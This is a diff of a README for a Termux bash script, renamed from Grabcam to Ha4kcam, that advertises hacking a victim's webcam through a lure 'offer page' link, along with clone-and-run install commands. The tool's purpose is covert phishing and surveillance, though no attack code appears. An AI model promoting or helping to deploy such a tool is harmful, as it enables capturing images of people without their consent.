@@ -1,15 +1,15 @@
-# Grabcam
+# Ha4kbcam
 Hack your victo web cam
 
 
-<h1 align="center">grabcam v1.1</h1>
+<h1 align="center">Ha4kbcam v1.1</h1>
 <p align="center">
       A camera hacking by link tool
 </p>
 
-## ?? ***About grabcam***:
+## ?? ***About ha4kcam***:
 
-grabcam is a bash based script which is officially made for termux from this tool can hack you victims camera by simple offer page. This tool works on both rooted Android device and Non-rooted Android device.
+ha4kcam is a bash based script which is officially made for termux from this tool can hack you victims camera by simple offer page. This tool works on both rooted Android device and Non-rooted Android device.
 
 ## 😒😐
 
@@ -34,7 +34,7 @@ grabcam is a bash based script which is officially made for termux from this too
 <a href="https://chat.whatsapp.com/FkcQ98SucwgK1TbTfGWzsR">![TikTok](https://img.shields.io/badge/H4CK.LK-%23000000.svg?style=for-the-badge&logo=TikTok&logoColor=FF0F00)</a>
 </p>
 
-### ?? ***grabcam is available for***:
+### ?? ***ha4kcam is available for***:
 
 * Termux
 
@@ -58,19 +58,19 @@ $ pkg install git -y
 $ pip install lolcat
 ```
 ```
-$ git clone https://github.com/Error-For-You/Grabcam
+$ git clone https://github.com/Error-For-You/Ha4kcam
 ```
 ```
 $ ls
 ```
 ```
-$ cd Grabcam
+$ cd Ha4kcam
 ```
 ```
 $ ls
 ```
 ```
-$ bash grabcam.sh
+$ bash hackcam.sh
 ```
 to see captured images >>>
 
